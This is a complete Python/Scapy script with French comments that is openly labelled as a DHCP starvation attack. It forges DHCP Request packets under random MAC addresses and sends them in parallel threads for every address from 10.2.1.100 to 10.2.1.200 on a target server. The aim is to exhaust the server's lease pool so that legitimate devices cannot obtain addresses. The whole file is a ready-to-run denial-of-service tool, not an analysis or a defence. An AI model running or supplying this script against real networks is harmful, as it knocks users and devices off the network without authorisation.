from scapy.all import *
from random import randint
import threading
import argparse
import time

def generate_random_mac():
    """Génère une adresse MAC aléatoire."""
    return "02:00:00:%02x:%02x:%02x" % (
        randint(0x00, 0x7F),
        randint(0x00, 0xFF),
        randint(0x00, 0xFF),
    )

def send_request(server_ip, ip):
    """Envoie une requête DHCP Request pour réserver une adresse IP spécifique."""
    mac_address = generate_random_mac()

    # Envoi de la requête DHCP Request pour l'adresse IP
    ethernet = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff")
    ip_pkt = IP(src="0.0.0.0", dst="255.255.255.255")
    udp = UDP(sport=68, dport=67)
    bootp = BOOTP(chaddr=[int(b, 16) for b in mac_address.split(":")], ciaddr="0.0.0.0", yiaddr=ip)
    dhcp_request = DHCP(
        options=[
            ("message-type", "request"),
            ("requested_addr", ip),  # Adresse demandée
            ("server_id", server_ip),
            ("end"),
        ]
    )

    request_packet = ethernet / ip_pkt / udp / bootp / dhcp_request
    sendp(request_packet, verbose=0)  # Envoi de la requête Request
    print(f"📤 DHCP Request envoyé pour l'adresse IP {ip}")

    # Attente de l'ACK
    ack = sniff(filter=f"udp and port 67 and host {server_ip}", count=1, timeout=10)
    if ack:
        print(f"✅ ACK reçu pour l'adresse IP {ip} - Réservation réussie.")
    else:
        print(f"❌ Pas d'ACK reçu pour l'adresse IP {ip}.")

def dhcp_starvation(server_ip, ip_range_start=100, ip_range_end=200):
    """Lance l'attaque DHCP Starvation pour occuper toutes les adresses dans la plage donnée."""
    print(f"💥 Lancement de l'attaque DHCP Starvation contre le serveur {server_ip}...\n")

    # Créer une liste des adresses IP à attaquer dans la plage spécifiée
    ip_list = [f"10.2.1.{i}" for i in range(ip_range_start, ip_range_end + 1)]

    # Envoi des requêtes Request en parallèle pour toutes les adresses IP
    threads = []
    for ip in ip_list:
        thread = threading.Thread(target=send_request, args=(server_ip, ip))
        thread.daemon = True
        threads.append(thread)
        thread.start()

    # Attendre que tous les threads aient terminé
    for thread in threads:
        thread.join()

    print("\n✅ Toutes les adresses IP ont été réservées avec succès.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script d'attaque DHCP Starvation.")
    parser.add_argument("server_ip", help="Adresse IP du serveur DHCP à attaquer")
    args = parser.parse_args()

    dhcp_starvation(args.server_ip)
